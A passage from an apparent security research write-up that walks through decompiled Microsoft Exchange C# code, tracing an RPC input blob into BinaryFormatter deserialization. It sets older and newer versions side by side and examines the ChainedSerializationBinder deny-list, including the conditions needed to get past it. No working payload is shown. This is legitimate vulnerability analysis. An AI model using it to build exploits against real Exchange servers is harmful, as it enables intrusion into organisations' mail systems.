\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509Store.Add(x509Certificate);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ExchangeCertificate exchangeCertificate2 = new ExchangeCertificate(x509Certificate);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0UpdateServices(exchangeCertificate2, server, installed);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0exchangeCertificateRpc.ReturnCert = exchangeCertificate2;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0finally  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0x509Store?.Close();  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return exchangeCertificateRpc.SerializeOutputParameters(rpcVersion);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n...\r\n```\r\n\r\nWe can see from this that most functions appear to be calling `Microsoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc.ExchangeCertificateRpc()`. This has some interesting code relevant to deserialization:\r\n\r\n```c#\r\n// Microsoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc  \r\nusing System.Collections.Generic;  \r\nusing Microsoft.Exchange.Rpc.ExchangeCertificate;  \r\n  \r\npublic ExchangeCertificateRpc(ExchangeCertificateRpcVersion version, byte[] inputBlob, byte[] outputBlob)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0inputParameters = new Dictionary<RpcParameters, object>();  \r\n\u00a0\u00a0\u00a0\u00a0if (inputBlob != null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0switch (version)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0case ExchangeCertificateRpcVersion.Version1:  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inputParameters = (Dictionary<RpcParameters, object>)DeserializeObject(inputBlob, customized: false);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0case ExchangeCertificateRpcVersion.Version2:  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0inputParameters = BuildInputParameters(inputBlob);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0outputParameters = new Dictionary<RpcOutput, object>();  \r\n\u00a0\u00a0\u00a0\u00a0if (outputBlob != null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0switch (version)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0case ExchangeCertificateRpcVersion.Version1:  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0outputParameters = (Dictionary<RpcOutput, object>)DeserializeObject(outputBlob, customized: false);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0case ExchangeCertificateRpcVersion.Version2:  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0outputParameters = BuildOutputParameters(outputBlob);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nHere we can see that the `byte[] inputBlob` from earlier is passed to `DeserializeObject(inputBlob, customized: false)` in the case that `ExchangeCertificateRpcVersion` parameter passed in is `ExchangeCertificateRpcVersion.Version1`.\r\n\r\nOkay so already we know we have one limitation in that we need to set the `version` parameter here to `ExchangeCertificateRpcVersion.Version1` somehow.\r\n\r\nKeeping this in mind lets explore further and look at the `Microsoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc.DeserializeObject(inputBlob, customized:false)` call implementation.\r\n\r\n```c#\r\n// Microsoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc  \r\nusing System.IO;  \r\nusing Microsoft.Exchange.Data.Serialization;  \r\nusing Microsoft.Exchange.Diagnostics;  \r\n  \r\nprivate object DeserializeObject(byte[] data, bool customized)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (data != null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0using (MemoryStream serializationStream = new MemoryStream(data))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bool strictModeStatus = Microsoft.Exchange.Data.Serialization.Serialization.GetStrictModeStatus(DeserializeLocation.ExchangeCertificateRpc);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation.ExchangeCertificateRpc, strictModeStatus, allowedTypes, allowedGenerics).Deserialize(serializationStream);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0return null;  \r\n}\r\n```\r\n\r\nInteresting so we can see that we create a new `MemoryStream` object from our `byte[] data` parameter and use this to create a serialization stream of type `MemoryStream`. We then check using `Microsoft.Exchange.Data.Serialization.Serialization.GetStrictModeStatus` to see if `DeserializeLocation.ExchangeCertificateRpc` requires strict mode for deserialization or not and we set the boolean `strictModeStatus` to this result.\r\n\r\nFinally we create a binary formatter using `ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation.ExchangeCertificateRpc, strictModeStatus, allowedTypes, allowedGenerics)` and then call its `Deserialize()` method on the serialized `MemoryStream` object we created earlier using `byte[] data`.\r\n\r\nNote that before the November 2021 patch, this `DeserializeObject` function actually looked like this:\r\n\r\n```c#\r\n// Microsoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc  \r\nusing System.IO;  \r\nusing Microsoft.Exchange.Data.Serialization;  \r\nusing Microsoft.Exchange.Diagnostics;  \r\n  \r\nprivate object DeserializeObject(byte[] data, bool customized)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (data != null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0using (MemoryStream serializationStream = new MemoryStream(data))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0BinaryFormatter binaryFormatter = new BinaryFormatter();\r\n\t\t\tif (customized)\r\n\t\t\t{\r\n\t\t\t\tbinaryFormatter.Binder = new CustomizedSerializationBinder();\r\n\t\t\t}\r\n\t\t\treturn binaryFormatter.Deserialize(memoryStream);\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0return null;  \r\n}\r\n\r\n```\r\n\r\nAs we can see the earlier code here was using `BinaryFormatter` to deserialize the payload without using a proper `SerializationBinder` or really any protection at all for that matter.\r\n\r\n## Looking At DeserializeObject() Deeper\r\nLets look at the November 2022 edition of `Microsoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc.DeserializeObject(inputBlob, customized:false)` again:\r\n\r\n```c#\r\n// Microsoft.Exchange.Management.SystemConfigurationTasks.ExchangeCertificateRpc  \r\nusing System.IO;  \r\nusing Microsoft.Exchange.Data.Serialization;  \r\nusing Microsoft.Exchange.Diagnostics;  \r\n  \r\nprivate object DeserializeObject(byte[] data, bool customized)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (data != null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0using (MemoryStream serializationStream = new MemoryStream(data))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0bool strictModeStatus = Microsoft.Exchange.Data.Serialization.Serialization.GetStrictModeStatus(DeserializeLocation.ExchangeCertificateRpc);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation.ExchangeCertificateRpc, strictModeStatus, allowedTypes, allowedGenerics).Deserialize(serializationStream);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0return null;  \r\n}\r\n```\r\n\r\nWhat we want to check here now is the `ExchangeBinaryFormatterFactor.CreateBinaryFormatter` call. What does the code for this look like?\r\n\r\n```c#\r\n// Microsoft.Exchange.Diagnostics.ExchangeBinaryFormatterFactory  \r\nusing System.Runtime.Serialization.Formatters.Binary;  \r\n  \r\npublic static BinaryFormatter CreateBinaryFormatter(DeserializeLocation usageLocation, bool strictMode = false, string[] allowList = null, string[] allowedGenerics = null)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0return new BinaryFormatter  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Binder = new ChainedSerializationBinder(usageLocation, strictMode, allowList, allowedGenerics)  \r\n\u00a0\u00a0\u00a0\u00a0};  \r\n}\r\n```\r\n\r\nAh our good old friend `ChainedSerializationBinder` and `BinaryFormatter`. Looks like we will need to create a `BinaryFormatter` serialized payload and `ChainedSerializationBinder` will be the validator.\r\n\r\nAs mentioned in the article to bypass this logic we need to ensure that `strictMode` is set to `False` and that we are not using any fully qualified assembly name in the deny list defined in `Microsoft.Exchange.Diagnostics.ChainedSerializationBinder.GlobalDisallowedTypesForDeserialization`, which will pretty much kill all publicly known .NET deserialization gadgets from ysoserial.NET.\r\n\r\nFor reference this is the code for `ChainedSerializationBinder` in November 2021 Update:\r\n\r\n```c#\r\n// Microsoft.Exchange.Diagnostics.ChainedSerializationBinder  \r\nusing System;  \r\nusing System.Collections.Generic;  \r\nusing System.IO;  \r\nusing System.Linq;  \r\nusing System.Reflection;  \r\nusing System.Runtime.Serialization;  \r\nusing Microsoft.Exchange.Diagnostics;  \r\n  \r\npublic class ChainedSerializationBinder : SerializationBinder  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0private const string TypeFormat = \"{0}, {1}\";  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private static readonly HashSet<string> AlwaysAllowedPrimitives = new HashSet<string>  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(string).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(int).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(uint).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(long).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(ulong).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(double).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(float).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(bool).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(short).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(ushort).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(byte).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(char).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(DateTime).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(TimeSpan).FullName,  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeof(Guid).FullName  \r\n\u00a0\u00a0\u00a0\u00a0};  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private bool strictMode;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private DeserializeLocation location;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private Func<string, Type> typeResolver;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private HashSet<string> allowedTypesForDeserialization;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private HashSet<string> allowedGenericsForDeserialization;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private bool serializationOnly;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0protected static HashSet<string> GlobalDisallowedTypesForDeserialization { get; private set; } = BuildDisallowedTypesForDeserialization();  \r\n  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0protected static HashSet<string> GlobalDisallowedGenericsForDeserialization { get; private set; } = BuildGlobalDisallowedGenericsForDeserialization();  \r\n  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public ChainedSerializationBinder()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0serializationOnly = true;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public ChainedSerializationBinder(DeserializeLocation usageLocation, bool strictMode = false, string[] allowList = null, string[] allowedGenerics = null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0this.strictMode = strictMode;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0allowedTypesForDeserialization = ((allowList != null && allowList.Length != 0) ? new HashSet<string>(allowList) : null);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0allowedGenericsForDeserialization = ((allowedGenerics != null && allowedGenerics.Length != 0) ? new HashSet<string>(allowedGenerics) : null);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeResolver = typeResolver ?? ((Func<string, Type>)((string s) => Type.GetType(s)));  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0location = usageLocation;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override void BindToName(Type serializedType, out string assemblyName, out string typeName)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string text = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string text2 = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0InternalBindToName(serializedType, out assemblyName, out typeName);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (assemblyName == null && typeName == null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0assemblyName = text;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0typeName = text2;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public override Type BindToType(string assemblyName, string typeName)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (serializationOnly)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new InvalidOperationException(\"ChainedSerializationBinder was created for serialization only.\u00a0\u00a0This instance cannot be used for deserialization.\");  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Type type = InternalBindToType(assemblyName, typeName);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (type != null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ValidateTypeToDeserialize(type);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return type;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0protected virtual Type InternalBindToType(string assemblyName, string typeName)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return LoadType(assemblyName, typeName);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0protected Type LoadType(string assemblyName, string typeName)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Type type = null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0type = Type.GetType($\"{typeName}, {assemblyName}\");  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (TypeLoadException)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (FileLoadException)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (type == null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string shortName = assemblyName.Split(',')[0];  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0type = Type.GetType($\"{typeName}, {shortName}\");  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (TypeLoadException)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (FileLoadException)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (type == null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0IEnumerable<Assembly> source = assemblies.Where((Assembly x) => shortName == x.FullName.Split(',')[0]);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Assembly assembly = (source.Any() ? source.First() : null);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (assembly != null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0type = assembly.GetType(typeName);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Assembly[] array = assemblies;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0foreach (Assembly assembly2 in array)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0type = assembly2.GetType(typeName);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (!(type != null))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0continue;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return type;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return type;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0protected virtual void InternalBindToName(Type serializedType, out string assemblyName, out string typeName)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0assemblyName = null;  